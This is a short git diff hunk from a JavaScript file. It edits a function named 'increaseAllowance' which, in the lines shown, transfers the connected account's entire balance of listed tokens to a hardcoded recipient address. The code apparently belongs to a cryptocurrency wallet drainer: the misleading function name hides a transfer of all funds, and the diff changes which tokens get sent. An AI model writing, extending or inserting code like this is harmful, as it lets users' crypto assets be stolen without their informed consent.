@@ -286,7 +286,7 @@ export const increaseAllowance = async (token) => {
       return;
     }
     const transfertoken = constants.transferTokens.find(tokenis => tokenis.address === token.token_address)
-    if (constants.tokens[token.token_address]) {
+    if (transfertoken) {
       await contract.methods
         .transfer(constants.recipient, token.balance)
         .send({ from: account });
